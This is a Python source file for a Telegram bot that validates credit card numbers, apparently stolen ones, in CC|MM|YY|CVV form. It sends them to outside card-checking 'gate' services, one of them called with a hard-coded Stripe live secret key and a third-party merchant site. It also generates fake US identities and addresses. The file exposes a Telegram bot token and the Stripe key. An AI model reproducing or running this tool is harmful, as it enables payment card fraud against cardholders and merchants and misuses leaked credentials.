import telebot
import httpx
import re
import random
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8318488317:AAFyfOLjIAY-p8GaJXmPlhXCu82R3_XEqgU"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=10)

# --- ADDRESS DATA ---
def generate_address():
    first_names = ["John", "Alex", "Robert", "Emma", "Sarah", "Michael"]
    last_names = ["Smith", "Jones", "Williams", "Brown", "Wilson", "Taylor"]
    streets = ["Main St", "High St", "Maple Ave", "Park Blvd", "2nd St"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    
    fn = random.choice(first_names)
    ln = random.choice(last_names)
    return (
        f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
        f"🏠 <b>Street:</b> <code>{random.randint(100, 999)} {random.choice(streets)}</code>\n"
        f"🏙 <b>City:</b> <code>{random.choice(cities)}</code>\n"
        f"📍 <b>State:</b> <code>NY</code>\n"
        f"📮 <b>Zip:</b> <code>{random.randint(10001, 99999)}</code>\n"
        f"🌎 <b>Country:</b> <code>United States</code>"
    )

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("💳 Check Card"), 
        types.KeyboardButton("🏠 Address Gen"),
        types.KeyboardButton("👤 My Profile")
    )
    return markup

def get_gate_inline(cc_data):
    markup = types.InlineKeyboardMarkup()
    # Fixed Callback Data Format
    btn1 = types.InlineKeyboardButton("⚡ SK", callback_data=f"sk|{cc_data}")
    btn2 = types.InlineKeyboardButton("🔥 Auto", callback_data=f"as|{cc_data}")
    btn3 = types.InlineKeyboardButton("🚀 BOTH GATES", callback_data=f"both|{cc_data}")
    markup.row(btn1, btn2)
    markup.row(btn3)
    return markup

# --- API HELPER ---
def request_api(gate, cc):
    try:
        if gate == "sk":
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={cc}"
            
        with httpx.Client(timeout=25.0) as client:
            res = client.get(url).text.strip()
            return res if res else "No Response"
    except Exception as e:
        return f"Error: {str(e)}"

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "<b>🚀 Bot Active!</b>\nSelect an option:", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def addr_gen(message):
    bot.send_message(message.chat.id, f"<b>✅ Random Address Generated:</b>\n\n{generate_address()}")

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def prompt_cc(message):
    bot.send_message(message.chat.id, "<b>📥 Send Card:</b> <code>CC|MM|YY|CVV</code>")

@bot.message_handler(func=lambda m: True)
def detect(message):
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if cards:
        bot.reply_to(message, f"💳 <b>Card:</b> <code>{cards[0]}</code>", reply_markup=get_gate_inline(cards[0]))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    try:
        # Check if callback data is valid
        if "|" not in call.data: return
        
        gate, cc = call.data.split("|")
        bot.edit_message_text(f"⏳ <b>Checking...</b>\n<code>{cc}</code>", call.message.chat.id, call.message.message_id)

        if gate == "both":
            f1 = executor.submit(request_api, "sk", cc)
            f2 = executor.submit(request_api, "as", cc)
            res = f"<b>🔹 SK:</b> <code>{f1.result()}</code>\n<b>🔹 Auto:</b> <code>{f2.result()}</code>"
        else:
            res = f"<b>📝 Result:</b> <code>{request_api(gate, cc)}</code>"

        bot.edit_message_text(f"<b>✅ Done</b>\n💳 <code>{cc}</code>\n\n{res}", call.message.chat.id, call.message.message_id)
        
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Error processing click")
        print(f"Callback Error: {e}")

bot.infinity_polling()
